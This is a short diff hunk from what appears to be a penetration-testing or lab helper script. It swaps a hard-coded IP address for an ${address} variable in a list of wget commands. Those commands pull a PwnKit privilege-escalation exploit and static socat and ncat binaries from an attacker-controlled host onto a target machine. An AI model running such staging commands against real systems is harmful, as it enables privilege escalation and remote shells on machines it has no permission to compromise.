@@ -34,7 +34,7 @@ commands=(
   "wget ${address}/pwnKit"
   "wget ${address}/static-binaries/x64/socat"
   "wget ${address}/static-binaries/x64/ncat"
-  "wget -rnpH 192.168.45.207/pwnkit4034"
+  "wget -rnpH ${address}/pwnkit4034"
 )
 
 # Set the terminal title
